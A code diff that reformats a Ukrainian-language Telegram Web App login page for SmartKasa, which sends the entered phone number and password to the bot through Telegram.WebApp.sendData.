@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="uk">
-<head>
-  <meta charset="UTF-8">
-  <title>Вхід в кабінет</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
+  <head>
+    <meta charset="UTF-8">
+    <title>Вхід в кабінет</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
     body {
       background-color: #f0f0f0;
       font-family: sans-serif;
@@ -29,15 +29,17 @@
       cursor: pointer;
     }
   </style>
-</head>
-<body>
-  <h2>Вхід в SmartKasa</h2>
-  <input type="text" id="phone" placeholder="Номер телефону">
-  <input type="password" id="password" placeholder="Пароль">
-  <button onclick="sendLogin()">Увійти</button>
+  </head>
+  <body>
+    <h2>Вхід в SmartKasa</h2>
+    <input type="text" id="phone" placeholder="Номер телефону">
+    <input type="password" id="password" placeholder="Пароль">
+    <button onclick="sendLogin()">Увійти</button>
 
-  <script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
     function sendLogin() {
+      const WebApp = window.Telegram.WebApp;
       const phone = document.getElementById("phone").value.trim();
       const password = document.getElementById("password").value.trim();
 
@@ -46,12 +48,12 @@
         return;
       }
 
-      Telegram.WebApp.sendData(JSON.stringify({
+      WebApp.sendData(JSON.stringify({
         phone_number: phone,
         password: password
       }));
-      Telegram.WebApp.close();
+      WebApp.close();
     }
   </script>
-</body>
+  </body>
 </html>
